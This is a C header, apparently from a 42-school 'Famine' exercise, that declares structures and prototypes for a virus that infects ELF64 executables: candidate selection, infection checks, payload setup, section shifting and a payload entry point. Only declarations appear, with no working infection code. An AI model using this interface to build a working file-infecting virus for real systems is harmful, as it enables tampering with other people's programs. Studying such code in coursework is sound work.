/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/12 13:53:25 by spolowy          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef INFECT_H
# define INFECT_H

# include <fcntl.h>
# include <stdint.h>
# include <unistd.h>
# include <sys/types.h>
# include "famine.h"
# include "accessors.h"

# define SHIFT_ALIGNMENT	4096
# define ALIGN(x, n)		(((x) + (n)) & ~((n) - 1))

/*
** file data
*/

struct				famine
{
	struct safe_pointer	original_safe;
	struct safe_pointer	clone_safe;
};

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

typedef	bool	(*f_iter_callback)(struct safe_pointer info, size_t offset, void *data);

/*
** iterators
*/

bool	foreach_phdr(const struct safe_pointer info, f_iter_callback callback, void *data);
bool	foreach_shdr(const struct safe_pointer info, f_iter_callback callback, void *data);

/*
** infect
*/

bool		infect_if_candidate(const char *file);
bool		elf64_packer(const struct famine food, size_t original_file_size);
bool		find_entry(struct entry *original_entry, struct safe_pointer info);
bool		check_if_infected(const struct entry *original_entry, const struct safe_pointer info);
bool		setup_payload(const struct entry *original_entry, const struct safe_pointer info);
bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry);
bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
			size_t shift_amount, size_t original_size);

/*
** payload
*/

void		_start(void);

#endif
